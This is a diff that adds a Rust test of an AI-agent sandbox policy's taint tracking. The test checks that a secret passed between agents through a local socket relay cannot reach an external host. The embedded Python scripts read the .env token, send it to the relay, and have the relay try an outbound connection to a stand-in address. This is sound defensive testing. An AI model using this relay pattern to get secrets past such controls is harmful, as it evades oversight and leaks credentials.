@@ -449,6 +449,61 @@ async fn a_secret_staged_outside_the_source_taints_whoever_reads_it() {
 
 #[tokio::test]
 #[serial(agent_policy)]
+async fn a_tainted_contact_with_a_local_relay_taints_the_relay() {
+    let fixture = Fixture::new();
+    fixture.write(".env", "TOKEN=1\n");
+    let outside = tempfile::tempdir().unwrap();
+    let outside = outside.path().display();
+    // The relay publishes its port, then reports whether it could reach an external peer once a
+    // client sent it something.
+    let relay = format!(
+        r#"import os, socket
+server = socket.socket()
+server.bind(("127.0.0.1", 0))
+server.listen(1)
+open("{outside}/port.tmp", "w").write(str(server.getsockname()[1]))
+os.rename("{outside}/port.tmp", "{outside}/port")
+connection, _ = server.accept()
+connection.recv(64)
+out = socket.socket()
+out.setblocking(False)
+open("{outside}/rc", "w").write(str(out.connect_ex(("192.0.2.1", 9))))
+"#
+    );
+    fixture.write("relay.py", &relay);
+    fixture.write(
+        "send.py",
+        &format!(
+            r#"import socket, time
+while True:
+    try:
+        port = int(open("{outside}/port").read())
+        break
+    except OSError:
+        time.sleep(0.05)
+data = open(".env", "rb").read()
+socket.create_connection(("127.0.0.1", port)).sendall(data)
+"#
+        ),
+    );
+    let relayer = fixture.agent(AgentPolicy::recommended().unwrap()).await;
+    let sender = fixture.agent(AgentPolicy::recommended().unwrap()).await;
+    // A command waits for its background jobs: leave the relay's running while the sender runs.
+    let relaying = relayer.run("python3 relay.py &");
+    let _ = tokio::time::timeout(std::time::Duration::from_millis(300), relaying).await;
+    accepted(&sender, "python3 send.py").await;
+    let rc = format!("{outside}/rc");
+    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(10);
+    while std::fs::metadata(&rc).is_err() && std::time::Instant::now() < deadline {
+        tokio::time::sleep(std::time::Duration::from_millis(50)).await;
+    }
+    assert_eq!(std::fs::read_to_string(&rc).unwrap(), BLOCKED);
+    close(sender).await;
+    close(relayer).await;
+}
+
+#[tokio::test]
+#[serial(agent_policy)]
 async fn one_agent_principal_carries_taint_across_its_shells() {
     let fixture = Fixture::new();
     fixture.write(".env", "TOKEN=1\n");
